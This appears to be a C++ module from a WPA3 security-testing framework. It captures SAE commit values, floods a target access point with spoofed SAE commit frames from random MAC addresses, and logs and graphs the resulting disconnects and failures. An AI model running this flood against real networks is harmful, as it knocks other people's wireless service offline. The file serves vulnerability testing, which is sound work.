#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"

#include <random>
#include <string>
#include <tins/tins.h>

#include "attacks/DoS_hard/dos_helpers.h"
#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "config/RunStatus.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"
#include "system/firmware/ath9k_htc.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::cookie_guzzler{

void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int attack_time,
				const sae_helper::SAEPair &sae_params, const string &att_mac, const size_t burst_size,
				const size_t packets_per_second_limit
){
	PacketSender sender(iface_name);
	dos_helpers::timed_burst(sender, attack_time, burst_size, packets_per_second_limit,
	[&]() -> optional<RadioTap>{
		// get cookie_guzzler frame
		return sae_helper::make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(att_mac) , sae_params);
	});
}

void run_attack(RunStatus &rs){
	const ActorPtr ap = rs.get_actor("access_point");
	const ActorPtr attacker = rs.get_actor("attacker");

	const auto &att_cfg = rs.config().at("attack_config");
	const optional<sae_helper::SAEPair> sae_params = get_commit_values(rs, attacker.get(SK::iface),
																		attacker.get(SK::sniff_iface),
																		rs.get_actor("access_point")->get(SK::ssid),
																		ap["mac"], 30);

	if(sae_params.has_value()){
		rs.start_observers();
		log(LogLevel::INFO, "SAE Commit captured");
		const HWAddress<6> ap_mac(ap["mac"]);
		const int duration = att_cfg.at("attack_time_sec").get<int>();
		// change to monitor mode
		attacker->set_monitor_mode();
		attacker->set_iface_up();
		check_vuln(attacker.get(SK::iface), ap_mac, duration, sae_params.value(), attacker["mac"],
					att_cfg.at("burst_size").get<size_t>(), att_cfg.at("packets_per_second_limit").get<size_t>());
	} else{
		throw run_err("SAE Commit capture failed");
	}
	rs.process_manager.write_log_all("@ENDofAttack");
	const int regeneration_time_sec = att_cfg.at("regeneration_time_sec").get<int>();
	this_thread::sleep_for(seconds(regeneration_time_sec));
	ap->conn->disconnect();
}

void stats_attack(const RunStatus &rs){
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, {
					{"access_point", "@ENDofAttack", "ENDofAttack", "yellow"},
					{"access_point", "did not acknowledge", "ACK_fail", "red"},
					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
					{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
					{"client", START_tag, "START", "black"}, {"client", END_tag, "END", "black"},
				});

	//const path STA_graph_path = observer::tshark_graph(rs, "client", events);
	//const path AP_graph_path =
	//    observer::tshark_graph(rs, "access_point", events, observer::get_observer_folder(rs, "tcpdump"));

	const auto ap = rs.config().at("actors").at("access_point");
	observer::resource_checker::create_graph(rs, ap["source"], elements);
}
}
